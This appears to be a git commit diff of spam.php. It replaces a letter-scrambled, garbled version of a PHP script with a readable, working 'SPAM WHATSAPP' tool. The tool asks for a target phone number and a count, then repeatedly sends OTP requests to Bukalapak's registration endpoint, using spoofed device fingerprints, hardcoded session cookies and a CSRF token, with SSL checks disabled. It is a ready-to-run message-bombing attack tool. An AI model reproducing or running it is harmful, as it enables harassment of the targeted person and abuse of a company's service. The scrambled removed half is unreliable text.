164ac45a56a3cb5aacba6a25eb9c60ef7ebfa1db
diheb82384 <98172372+diheb82384@users.noreply.github.com>
2022-02-25 12:25:43 +0700

    Update spam.php

--- spam.php
+++ spam.php
@@ -1,105 +1,105 @@
-<?mww
-@tviff_ivtdfkbvt(K_ELW ^ (P_RBHBKG | I_AWREVVT));
-yqqlxq('onper');
-$gxvt1 = alc("samih://axhsyy.cqa/");
-$m = ebmazrh('zvlfy="',$txvt1);
-$ox = tbmazrh('"',$e[1]);
-//egjv $wx[0];
-$q = fbmazrh('MAH :</q><cs>',$gxvt1);
-$oah = tbmazrh('<',$f[1]);
-$d = gbmazrh('Oyht :</b><cs>',$gxvt1);
-$qyht = ebmazrh('<',$g[1]);
-$f = hbmazrh('xbbep="',$txvt1);
-$tt = kbmazrh('"',$h[1]);
-izhpvbwb hlc($flc){
-$sledhvj = sriry();
-$fledhvj[] = "Eanhtwl/5.0 (Ltvhr; Xnqufwl 10; Uvhpu Vbhx 8) EpeapAafLsb/537.36 (DRAFX, wtso Kkgmy) Qjyfaq/87.0.4280.67 Qapjtp Wsffrz/537.36";
-$kj = jwlc_tvvb();
-     vwlc_dwxhdi($vj, JWLCZDI_NLC, $flc);
-     nwlc_dwxhdi($vj, JWLCZDI_YTZWZKHZQCTBWB, gkly);
-     gwlc_dwxhdi($vj, JWLCZDI_KVXNLEGKRNFXJV, 1);
-     twlc_dwxhdi($vj, JWLCZDI_AAMIWLEDHV, $yledhvj);
-     $jvw = uwlc_pbbg($ej);
-yvxnle $evw;
+<?php
+@error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));
+system('clear');
+$ping1 = url("https://ipsaya.com/");
+$a = explode('value="',$ping1);
+$ip = explode('"',$a[1]);
+//echo $ip[0];
+$b = explode('ISP :</b><br>',$ping1);
+$isp = explode('<',$b[1]);
+$c = explode('Kota :</b><br>',$ping1);
+$kota = explode('<',$c[1]);
+$d = explode('title="',$ping1);
+$ng = explode('"',$d[1]);
+function url($url){
+$headers = array();
+$headers[] = "Mozilla/5.0 (Linux; Android 10; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Mobile Safari/537.36";
+$ch = curl_init();
+      curl_setopt($ch, CURLOPT_URL, $url);
+      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+      curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+      $res = curl_exec($ch);
+return $res;
 }
 
 
 
-wgjv " \033[1;97aaMmil Zx Pdguvwk \033[1;91e".$ux[0]."\c";
-rgjv " \033[1;97aaMmil ZAH        \033[1;92b".$uah[0]."\c";
-rgjv " \033[1;97aaMmil Tkbr       \033[1;92k".$wyht[0]."\n";
-rgjv " \033[1;97aaMmil Tqihgkp    \033[1;92k".$zt[0]."\t\a";
-fdpit(3);
-tgjv " \033[1;91aTpq \033[1;92uUU NPCH \033[1;91fEHPM \z";
-fdpit(3);
-hqqlxq("onper");
-//vbfb;
-//lqqlxq("dd oqcysm.xqq");
-wdtx_hhjfufe_mbuqdnbr_wwx("Tsai/Jjkkrkt");
-egjv $po="\033[1;91z @@@  @@@@@@@@@@      @@@@@@@    @@@@@@    @@@@@@   @@@@@@@  
+echo " \033[1;97m•Your Ip Address \033[1;91m".$ip[0]."\n";
+echo " \033[1;97m•Your ISP        \033[1;92m".$isp[0]."\n";
+echo " \033[1;97m•Your City       \033[1;92m".$kota[0]."\n";
+echo " \033[1;97m•Your Country    \033[1;92m".$ng[0]."\n\n";
+sleep(3);
+echo " \033[1;91mHii \033[1;92mIM BOOT \033[1;91mSPAM \n";
+sleep(3);
+system("clear");
+//exit;
+//system("rm cookie.txt");
+date_default_timezone_set("Asia/Jakarta");
+echo $bn="\033[1;91m @@@  @@@@@@@@@@      @@@@@@@    @@@@@@    @@@@@@   @@@@@@@  
 @@@  @@@@@@@@@@@     @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@  
 @@!  @@! @@! @@!     @@!  @@@  @@!  @@@  @@!  @@@    @@!    
-!@!  !@! !@! !@!     !@   @!@  !@!  @!@  !@!  @!@    !@!
-\033[1;31y!@@     !!@  @!! !!@ @!@     @!@!@!@   @!@  !@!  @!@  !@!    @!!    
+!@!  !@! !@! !@!     !@   @!@  !@!  @!@  !@!  @!@    !@! 
+\033[1;31m!@@     !!@  @!! !!@ @!@     @!@!@!@   @!@  !@!  @!@  !@!    @!!    
 !!!  !@!   ! !@!     !!!@!!!!  !@!  !!!  !@!  !!!    !!!    
 !!:  !!:     !!:     !!:  !!!  !!:  !!!  !!:  !!!    !!:    
 :!:  :!:     :!:     :!:  !:!  :!:  !:!  :!:  !:!    :!:    
-::  :::     ::       :: ::::  ::::: ::  ::::: ::     ::    
+ ::  :::     ::       :: ::::  ::::: ::  ::::: ::     ::    
 :     :      :       :: : ::    : :  :    : :  :      : ,
-\033[1;37y EUTZXI OZVJAWB\033[1;92z $EU ";
-ggjv " \033[1;97aaMmil Zx Pdguvwk \033[1;32e".$ux[0]."\c";
-rgjv "\033[1;97a                PDTX \033[1;32q".pdtx("h.p.K ")."\033[1;97k   FBUQ \033[1;32q".pdtx("L:p:a")."\f";
-rgjv "GHPM IDHTLSPE\c\a";
-rgjv "Bbaaf Ktrxkx?\gVvcjn : ";
-$gbaqv = kkzu(rlkxl(KLWLV));
-vn(xlkcpr($abaqv)==11){
-   $ebaqv = jlk_ivtalcg("0","62".$rbaqv);
-}vpdwmn(xlkcpr($abaqv)>12){
-   $ebaqv = jlk_ivtalcg("62","0",$rbaqv);
+\033[1;37m SCRIPT VERSION\033[1;92m $SC ";
+echo " \033[1;97m•Your Ip Address \033[1;32m".$ip[0]."\n";
+echo "\033[1;97m                DATE \033[1;32m".date("d.m.Y ")."\033[1;97m   TIME \033[1;32m".date("H:i:s")."\n";
+echo "SPAM WHATSAPP\n\n";
+echo "Nomor Target?\nInput : ";
+$nomer = trim(fgets(STDIN));
+if(strlen($nomer)==11){
+	$nomer = str_replace("0","62".$nomer);
+}elseif(strlen($nomer)>12){
+	$nomer = str_replace("62","0",$nomer);
 }
-vgjv "Htrxkx: $gbaqv (p/l)";
-$pgo = dkzu(rlkxl(KLWLV));
-vn($hgo=="x") rbfb("Llhdeth!\q");
-rgjv "Xdgxlh?\uVvcjn : ";
-$cdgxlh = akzu(rlkxl(KLWLV));
-stf($r=0;$a<$jdgxlh;$h++) {
-   $rrnq1 = pp5(urnq(12345678,98765432));
-   $urnq2 = pp5(urnq(12345678,98765432));
-   $urnq = driry($prnq1,$urnq2);
-   $urnq3 = pp5($urnq[urnq(1,2)]);
-   $fqbsno['nledhvj'] = wbmazrh("\r", "Uvgl: f.nvekllppk.mqa
-Oqbargvbwb: xoit-pltdz
-Gqbgxrg-Eprtza: 134
-Vfzoov: uamih://e.nvekllppk.mqa
-J-ZUJW-Yhyor: hSSzn93o92sLapPWW4VGiUGvbfSOBueWCEbQJNbsRoa+qpwJ8GGZam9wIyWMW9MDp7cP8R/YfoZSAm0PAD1rof==
-Qmwv-Rgkrg: Fanhtwl/5.0 (Ltvhr; Xnqufwl 7.1.2; Uvhpu 4F Yvcto/Q2T47N) HpeapAafLsb/537.36 (DRAFX, wtso Kkgmy) Qjyfaq/68.0.3440.91 Qapjtp Wsffrz/537.36
-Kqbgxrg-Mrnt: epeatkctbwb/k-tss-btfd-glcprpqrhh; fjhrjwx=NNY-8
-Fcegti: */*
-Q-Ovukywlxh-Zeba: EJXSamiGvukywl
-Lsvz-Hdtt: ob
-Evjjvvv: yamih://e.nvekllppk.mqa/dvkoalxv?wwfa=tvaq_qapjtp
-Ecegti-Xrpqrlvt: mfhx, shjqltx, fs
-Rcegti-Elntaugk: ir-HM,wr;d=0.9,yl;t=0.8
-Sqcysm: mlhrgbbr=".$prnq1."; esfkowv_zl=".$urnq2."; _jg=GG1.2.1024758930.1531960985; _vrk_iocl_y2=YH8I70I7I9E8960F05K20KJ0ECG87643F|378f4e2f30h36053e1ed833f89igdd2g; _kol=JG1.2.622427606.1533988422; suu=%7T%22u%22%3T1%7D; vhJCL=15339884253603f43d2eh12.g5d45553; twwkawb_vl=h95i7511997432ef179935fbghg90320; __euw=3gih305416528g5i584187g45c2; H_KRNBMPH_LLSH=yucurp; xkrcm_bvkoalxv=kkly; efknttitx_plnqlvt_bdaab=mkly; qb_51467p440fk602j0g13f513f36387ge8_mufmpnrp=%7M%22elalbvpv_bl%22%3D%20%22164afki88de1h-0791gece558d18-1f20130h-38400-164cfki88dfk4%22%2H%22wnf_egiltg%22%3E%20%22hhsgtkjvj-1851%22%2U%22wnf_yqhlcg%22%3M%20%22afknttitx%22%2G%22wnf_ocmbpiot%22%3N%20%2215%22%2C%22%24kvvbbil_cvjjvivv%22%3R%20%22%24dlzvgv%22%2V%22%24kvvbbil_cvjjvizvt_jramiv%22%3N%20%22%24dlzvgv%22%7W; lvf-ygSKAl=ffg66iki-18fg-e176-a3c3-26h0fc9gg000_1534027025; ndctojafay34nnq23ksaq234=lpMtKcXOc3WFC3zgYRlmMgAXDf5HIx1zLifsU1V1YjoNBd1ymjJzQWivKMDcvFMSE0khD0acBTqMbmfCD1HOb1Y2abkBtmIqEyQZLUQvZdLpGcZEIOOpcANKuHB5LKxsFdMiE3ExqGg3ck9AuLwLOdaGEGX4iJlfQ2WnmHYip2fZwUPjNyUuLQNuXHUvI2ZXGg1VlXSrMJStILYWM01KNOD4nnl4OI5IFN5ntGEuV2L0nGizI05WIw9GkVa3iUazv3gcaTl4uIk4ZC9TFcvctJQcM0wKBOLLLML5OTjmz0iSB3tbSW9PM2U6POHSDkHBhF84VVxjEVGkVjAATAzbZJ0lO3kBmmZCCQkRD1YtN202P1RlXHD5mc09--5z445aejj0g06d736d22g9j359ji3f7273058175; jvfvuJN=32; _ow=7h03jfcd-b77c-4eg7-8f83-2427781d78e7");
-   irzpbl $nqbsno;
-   $gr = yami_qvcto_tkyvp(yriry(
-               'djetnlv' => 'twvbr_vvkoalkrtbwb',
-               'sjetnlv_xtg' => '',
-               'smnhul_awvbr' => $rbaqv,
-               'uhzdkg_jnvtkvggzvg' => $krnq3,
-               'fjhnarp' => 'HdhtlSpe'
-                            )
-                          );
-   $rj = jwlc_tvvb();
-   vwlc_dwxhdi($vj, JWLCZDI_NLC, "samih://e.nvekllppk.mqa/fklmlxh_ghzdkgw/ghi_gvukywl");
-   vwlc_dwxhdi($vj, JWLCZDI_LKD_GZVZNDNTIV, wfldw);
-   gwlc_dwxhdi($vj, JWLCZDI_YTZWZKHZQCTBWB, gkly);
-   gwlc_dwxhdi($vj, JWLCZDI_KVXNLEGKRNFXJV, kkly);
-   gwlc_dwxhdi($vj, JWLCZDI_ALEDHV, wfldw);
-   gwlc_dwxhdi($vj, JWLCZDI_AAMIWLEDHV, $tqbsno['nledhvj']);
-   uwlc_dwxhdi($vj, JWLCZDI_IDGL, 1);
-   vwlc_dwxhdi($vj, JWLCZDI_IDGLYNMPOV, $sr);
-   $rso = ywlc_pbbg($ej);
-   jwlc_nnzgw($gj);
-   wgzvg $t.$nbaqv." [Jwrqlvt]\t";
+echo "Target: $nomer (y/n)";
+$cek = trim(fgets(STDIN));
+if($cek=="n") exit("Stopped!\n");
+echo "Jumlah?\nInput : ";
+$jumlah = trim(fgets(STDIN));
+for($a=0;$a<$jumlah;$a++) {
+	$rand1 = md5(rand(12345678,98765432));
+	$rand2 = md5(rand(12345678,98765432));
+	$rand = array($rand1,$rand2);
+	$rand3 = md5($rand[rand(1,2)]);
+	$config['headers'] = explode("\n", "Host: m.bukalapak.com
+Connection: keep-alive
+Content-Length: 134
+Origin: https://m.bukalapak.com
+X-CSRF-Token: uYUfi93g92mZboBVB4UMwYInorBNOgyYEAbPUTikHht+xseF8BFUgg9qSgQWA9MRy7eL8G/SnbYUGg0JRM1fjw==
+User-Agent: Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Accept: */*
+X-Requested-With: XMLHttpRequest
+Save-Data: on
+Referer: https://m.bukalapak.com/register?from=home_mobile
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9,id;q=0.8
+Cookie: identity=".$rand1."; browser_id=".$rand2."; _ga=GA1.2.1024758930.1531960985; _vwo_uuid_v2=DE8E70E7E9A8960F05F20FE0ACE87643B|378e4a2f30c36053c1cb833e89ecbc2e; _gid=GA1.2.622427606.1533988422; scs=%7B%22t%22%3A1%7D; spUID=15339884253603c43b2de12.c5b45553; session_id=e95e7511997432af179935abfce90320; __auc=3eed305416528d5f584187b45b2; G_ENABLED_IDPS=google; track_register=true; affiliate_landing_visit=true; mp_51467a440ff602e0c13d513c36387ea8_mixpanel=%7B%22distinct_id%22%3A%20%22164affd88ae1d-0791dbbd558a18-1f20130c-38400-164affd88aff4%22%2C%22utm_source%22%3A%20%22hasoffers-1851%22%2C%22utm_medium%22%3A%20%22affiliate%22%2C%22utm_campaign%22%3A%20%2215%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D; ins-gaSSId=cdd66ffd-18ce-a176-a3c3-26f0ac9ec000_1534027025; lskjfewjrh34ghj23brjh234=elBsSkNBb3VKS3hzZSttTnNKTm5VNk1pWmtzV1A1YldKRm1majAzRFdsSUJtcDJJV0psL0pnOFlBamtJU1NBa1Y2czlQdjZrNlFURDNiRmZqQmNRRXRyeWRTbGV5QUdpQnZjV3JocEc3ak9QeHpWSlpRNTE4eFgzR2FieDVnc2dWaUVoZzVzMEJlMVZwM2NKWk1LaXVwQTZuOXBVR01TUUJ4ejc4MW5MTU5taGYwZ2M0bFdwM05KYy9IcTh3bThsd3dzbSt4bHd4WG9NSklrcHJtT0dHUURURVQ5YVoyb0hLQ3dyUC9NZ2V6UUNFYmVGbE84REtqOHZlKzBZUGtiRS0tV3pMamNPNDhKT1FoZ202Q1BkNUJ5dz09--5a445aefe0c06b736c22e9f359ee3b7273058175; insdrSV=32; _td=7e03facb-a77c-4ce7-8b83-2427781c78c7");
+	global $config;
+	$ar = http_build_query(array(
+				'feature' => 'phone_registration',
+				'feature_tag' => '',
+				'manual_phone' => $nomer,
+				'device_fingerprint' => $rand3,
+				'channel' => 'WhatsApp'
+                             )
+                           );
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, "https://m.bukalapak.com/trusted_devices/otp_request");
+	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+	curl_setopt($ch, CURLOPT_HEADER, false);
+	curl_setopt($ch, CURLOPT_HTTPHEADER, $config['headers']);
+	curl_setopt($ch, CURLOPT_POST, 1);
+	curl_setopt($ch, CURLOPT_POSTFIELDS, $ar);
+	$asw = curl_exec($ch);
+	curl_close($ch);
+	print $a.$nomer." [Sending]\n";
 }
